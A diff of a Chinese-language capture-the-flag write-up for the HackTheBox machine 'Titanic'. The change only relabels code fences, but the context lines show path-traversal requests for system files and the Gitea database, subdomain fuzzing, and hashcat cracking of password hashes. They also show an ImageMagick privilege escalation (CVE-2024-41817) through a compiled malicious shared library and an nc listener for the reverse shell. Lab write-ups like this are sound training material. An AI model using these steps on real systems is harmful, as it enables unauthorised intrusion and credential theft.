@@ -16,7 +16,7 @@ Operating System: Linux
 
 ## 资产探测
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.55
 Nmap scan report for bogon (10.10.11.55)
@@ -85,7 +85,7 @@ Service Info: Host: titanic.htb
 
 在查看网络通信的过程中，发现其存在有路劲穿越漏洞
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ http get http://titanic.htb/download?ticket=../../../../../../etc/hostname
 HTTP/1.1 200 OK
@@ -228,7 +228,7 @@ developer:x:1000:1000:developer:/home/developer:/bin/bash
 
 尝试对子域名进行爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://titanic.htb -H 'Host: FUZZ.titanic.htb' -fc 301
 
@@ -308,7 +308,7 @@ services:
 
 根据 Gitea 的官方文档，可以推断数据库文件可能位于 `/home/developer/gitea/data/gitea/gitea.db`
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ wget http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db
 --2025-03-28 15:47:25--  http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db
@@ -370,7 +370,7 @@ sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWc
 sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
 ```
 
-```shell
+```bash
 PS D:\_Tools\hashcat-6.2.6> .\hashcat.exe -d 1 -O -a 0 -m 10900 .\hash.txt .\dics\rockyou.txt --show
 sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
 ```
@@ -379,7 +379,7 @@ sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfL
 
 ## User - developer
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs developer@10.10.11.55
 [16:06:01] Welcome to pwncat 🐈!
@@ -416,7 +416,7 @@ developer
 
 尝试使用 `pspy` 监控系统进程
 
-```shell
+```bash
 (remote) developer@titanic:/tmp$ ./pspy64 -f=true
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
@@ -446,7 +446,7 @@ done
 
 同时查看脚本内容
 
-```shell title="/opt/scripts/identify_images.sh"
+```bash title="/opt/scripts/identify_images.sh"
 cd /opt/app/static/assets/images
 truncate -s 0 metadata.log
 find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
@@ -454,7 +454,7 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 
 推测是存在有一个不可见的定时任务，尝试使用 `CVE-2024-41817` 进行提权
 
-```shell
+```bash
 (remote) developer@titanic:/tmp$ cd /opt/app/static/assets/images/
 (remote) developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
 #include <stdio.h>
@@ -470,7 +470,7 @@ EOF
 
 稍等片刻，即可收到回连的shell
 
-```shell
+```bash
 ┌──(randark㉿kali)-[~/tools]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
